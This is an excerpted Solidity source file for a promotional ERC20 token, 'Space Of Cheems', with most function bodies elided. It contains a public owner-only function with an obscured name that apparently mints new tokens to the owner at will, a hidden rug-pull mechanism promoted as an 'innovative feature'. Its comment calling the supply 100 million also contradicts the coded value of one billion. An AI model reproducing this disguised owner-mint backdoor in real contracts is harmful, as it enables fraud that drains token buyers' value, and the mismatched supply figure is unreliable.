...
//
// $SpaceOfCheems proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/SpaceOfCheems
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Spaceofcheems(uint256 amount) public onlyOwner {
 _Spaceofcheems(msg.sender, amount);
    }
    ...
    function _Spaceofcheems(address account, uint256 amount) internal virtual {
...
contract $SpaceOfCheems is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Space Of Cheems", "SPACEOFCHEEMS") {
        _Spaceofcheems(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}